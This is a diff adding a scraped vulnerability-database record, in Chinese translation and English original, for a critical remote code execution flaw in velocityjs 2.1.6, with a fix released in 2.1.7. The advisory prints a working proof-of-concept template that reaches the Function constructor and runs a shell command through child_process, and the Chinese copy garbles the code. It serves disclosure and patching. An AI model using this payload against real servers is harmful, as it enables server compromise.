@@ -1,0 +1,203 @@
+{
+  "saved_at": "2026-08-13T19:53:44+00:00",
+  "first_seen": true,
+  "translated": true,
+  "source_list": "https://www.oscs1024.com/oscs/v1/vdb/vuln_info",
+  "source_page": "https://www.oscs1024.com/hd/MPS-2dgi-697b",
+  "detail": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。",
+        "title": "什么是代码注入"
+      },
+      {
+        "content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。",
+        "title": "代码注入常见的攻击方式"
+      },
+      {
+        "content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。",
+        "title": "如何预防代码注入"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-73649",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "security-advisories@github.com",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "severity": "critical",
+          "base_score": 9.8
+        }
+      ]
+    },
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": "CWE-94",
+    "description": "### 总结\n\nvelocityjs v2.1.6 中通过对 Function 构造函数的属性读取来实现远程代码执行 (RCE)。这绕过了 GHSA-j658-c2gf-x6pq（“#set 路径分配中的原型污染”）的修复 - 该建议仅在 #set 分配处理程序 (set.cjs) 中阻止了构造函数/__proto__/prototype，但属性读取表达式未经过过滤。任何呈现攻击者控制的 Velocity 模板的应用程序都容易受到服务器上任意代码执行的攻击。\n\n### 详细信息\n\nGHSA-j658-c2gf-x6pq 将 isBlockedPathKey() 添加到 dist/cjs/compile/set.cjs:35-43，它会阻止 __proto__、构造函数和原型键。但是，此检查仅在 #set 指令分配值时运行 - 它验证分配目标路径，而不是正在评估的值表达式。\n值表达式通过 dist/cjs/compile/references.cjs:16 中的 getReferences() 进行计算，它在第 81 行调用 getAttributes()。第 88-89 行的属性访问没有过滤：\n// 参考文献.cjs:81-91\ngetAttributes（属性，baseRef，ast）{\n  if (property.type === \"属性\") {\n    返回baseRef[属性.id]；  // ← “构造函数”、“原型”等上没有块。\n  }\n  ...\n}\n同时，set.cjs:35-43 正确地阻止了这些键，但仅限于 #set 目标：\n// 设置.cjs:35-43\nisBlockedPathKey(baseRef, key, isEnd) {\n  if (key === PROTO_KEY) 返回 true;          //“__proto__”\n  if (key === \"prototype\" && typeof baseRef === \"function\") return true;\n  return !isEnd && PROTOTYPE_CHAIN_KEYS.has(key) && !hasOwnProperty(baseRef, key);\n}\n漏洞利用链：\n1. $x.constructor → getAttributes() → {}[\"constructor\"] → 对象\n2. .constructor → getAttributes() → 对象[\"constructor\"] → 函数\n3. (\"return process.mainModule.require('child_process').execSync('whoami')\") → 调用 Function(...) → 创建一个函数\n4.#set将结果赋值给$f，然后将其渲染为$r\n#set 处理程序验证 $f 作为赋值目标（通过 - f 未被阻止），但从不检查右侧表达式以进行原型链遍历。\n\n### 概念验证\n\nconst 速度 = require('velocityjs');\n\nconst template = \"#set($f=$x.constructor.constructor(\\\"return process.mainModule.require('child_process').execSync('whoami').toString()\\\"))#set($r=$f())$r\";\n\nconsole.log(velocity.render(template, { x: {} }));\n// 输出：<当前操作系统用户名>\n在velocityjs v2.1.6、Node.js v24.15.0、Windows 上进行了验证。\n\n### 影响\n\n类型：远程代码执行 (RCE)\n\n任何使用velocityjs呈现攻击者控制的Velocity模板的应用程序都容易受到整个服务器的攻击。攻击者可以执行任意 shell 命令、读取环境变量、访问云凭据以及访问内部网络资源。\n现有的通报 GHSA-j658-c2gf-x6pq 建立了威胁模型：“任何呈现攻击者控制模板的应用程序”。这一发现表明修复并不完整——添加了 #se​​t 阻塞，但属性读取表达式仍未过滤，这使得问题变得更糟（RCE 与原型污染）。\n\n### 补丁\n\n已在 [velocityjs 2.1.7](https://www.npmjs.com/package/velocityjs/v/2.1.7) 中修复。该修复已合并到 [pull request #192](https://github.com/shepherdwind/velocity.js/pull/192) 中，并作为 [v2.1.7](https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7) 发布。用户应升级到2.1.7或更高版本。",
+    "effects": [
+      {
+        "comp_name": "velocityjs",
+        "ecosystem": "npm",
+        "versions": [
+          {
+            "affected_version": "(-∞,2.1.6]",
+            "min_fixed_version": "",
+            "repository": "npm",
+            "solutions": [],
+            "upstream": true
+          },
+          {
+            "affected_version": "(-∞,2.1.7)",
+            "min_fixed_version": "2.1.7",
+            "repository": "npm",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "建议修复",
+    "kind": "代码注入",
+    "kind_en": "代码生成控制不当（“代码注入”）",
+    "last_modified_time": "2026-08-14",
+    "level": "Critical",
+    "mps_id": "MPS-2dgi-697b",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-14",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/security/advisories/GHSA-7gfh-x38p-prh3",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/pull/192",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/commit/f8e47a6c4607249b9c967d3a1ced959b4dd64dba",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-7gfh-x38p-prh3",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [
+      "npm",
+      "开源"
+    ],
+    "title": "Velocity.js：通过属性读取到函数构造函数来远程执行代码（绕过 GHSA-j658-c2gf-x6pq 修复）",
+    "_translated": true
+  },
+  "detail_original": {
+    "analysis_status": 0,
+    "articles": [
+      {
+        "content": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。",
+        "title": "什么是代码注入"
+      },
+      {
+        "content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。",
+        "title": "代码注入常见的攻击方式"
+      },
+      {
+        "content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。",
+        "title": "如何预防代码注入"
+      }
+    ],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-73649",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "security-advisories@github.com",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "severity": "critical",
+          "base_score": 9.8
+        }
+      ]
+    },
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": "CWE-94",
+    "description": "### Summary\n\nRemote Code Execution (RCE) in velocityjs v2.1.6 via property-read to the Function constructor. This bypasses the fix for GHSA-j658-c2gf-x6pq (\"Prototype Pollution in #set path assignment\") — that advisory blocked constructor/__proto__/prototype only in the #set assignment handler (set.cjs), but property read expressions are unfiltered. Any application rendering attacker-controlled Velocity templates is vulnerable to arbitrary code execution on the server.\n\n### Details\n\nGHSA-j658-c2gf-x6pq added isBlockedPathKey() to dist/cjs/compile/set.cjs:35-43, which blocks __proto__, constructor, and prototype keys. However, this check only runs when the #set directive assigns a value — it validates the assignment target path, not the value expression being evaluated.\nThe value expression is evaluated via getReferences() in dist/cjs/compile/references.cjs:16, which calls getAttributes() at line 81. The property access at line 88-89 has no filtering:\n// references.cjs:81-91\ngetAttributes(property, baseRef, ast) {\n  if (property.type === \"property\") {\n    return baseRef[property.id];  // ← NO BLOCK on \"constructor\", \"prototype\", etc.\n  }\n  ...\n}\nMeanwhile, set.cjs:35-43 properly blocks these keys, but only for the #set target:\n// set.cjs:35-43\nisBlockedPathKey(baseRef, key, isEnd) {\n  if (key === PROTO_KEY) return true;          // \"__proto__\"\n  if (key === \"prototype\" && typeof baseRef === \"function\") return true;\n  return !isEnd && PROTOTYPE_CHAIN_KEYS.has(key) && !hasOwnProperty(baseRef, key);\n}\nThe exploit chain:\n1. $x.constructor → getAttributes() → {}[\"constructor\"] → Object\n2. .constructor → getAttributes() → Object[\"constructor\"] → Function\n3. (\"return process.mainModule.require('child_process').execSync('whoami')\") → calls Function(...) → creates a function\n4. The #set assigns the result to $f, which is then rendered as $r\nThe #set handler validates $f as the assignment target (which passes — f is not blocked), but never inspects the right-hand expression for prototype chain traversal.\n\n### PoC\n\nconst velocity = require('velocityjs');\n\nconst template = \"#set($f=$x.constructor.constructor(\\\"return process.mainModule.require('child_process').execSync('whoami').toString()\\\"))#set($r=$f())$r\";\n\nconsole.log(velocity.render(template, { x: {} }));\n// Output: <current OS username>\nVerified on velocityjs v2.1.6, Node.js v24.15.0, Windows.\n\n### Impact\n\nType: Remote Code Execution (RCE)\n\nAny application that renders attacker-controlled Velocity templates using velocityjs is vulnerable to full server compromise. The attacker can execute arbitrary shell commands, read environment variables, access cloud credentials, and pivot to internal network resources.\nThe existing advisory GHSA-j658-c2gf-x6pq established the threat model: \"any app rendering attacker-controlled templates.\" This finding demonstrates that the fix was incomplete — the #set blocking was added but property read expressions remain unfiltered, making the issue strictly worse (RCE vs prototype pollution).\n\n### Patches\n\nFixed in [velocityjs 2.1.7](https://www.npmjs.com/package/velocityjs/v/2.1.7). The fix was merged in [pull request #192](https://github.com/shepherdwind/velocity.js/pull/192) and released as [v2.1.7](https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7). Users should upgrade to version 2.1.7 or later.",
+    "effects": [
+      {
+        "comp_name": "velocityjs",
+        "ecosystem": "npm",
+        "versions": [
+          {
+            "affected_version": "(-∞,2.1.6]",
+            "min_fixed_version": "",
+            "repository": "npm",
+            "solutions": [],
+            "upstream": true
+          },
+          {
+            "affected_version": "(-∞,2.1.7)",
+            "min_fixed_version": "2.1.7",
+            "repository": "npm",
+            "solutions": [],
+            "upstream": true
+          }
+        ]
+      }
+    ],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "Recommend",
+    "kind": "代码注入",
+    "kind_en": "Improper Control of Generation of Code ('Code Injection')",
+    "last_modified_time": "2026-08-14",
+    "level": "Critical",
+    "mps_id": "MPS-2dgi-697b",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-08-14",
+    "reference_url_list": [
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/security/advisories/GHSA-7gfh-x38p-prh3",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/pull/192",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/commit/f8e47a6c4607249b9c967d3a1ced959b4dd64dba",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7",
+        "name": ""
+      },
+      {
+        "url": "https://github.com/advisories/GHSA-7gfh-x38p-prh3",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [
+      "npm",
+      "开源"
+    ],
+    "title": "Velocity.js: Remote Code Execution via property-read to Function constructor (bypass of GHSA-j658-c2gf-x6pq fix)"
+  },
+  "first_saved_at": "2026-08-13T19:53:44+00:00"
+}
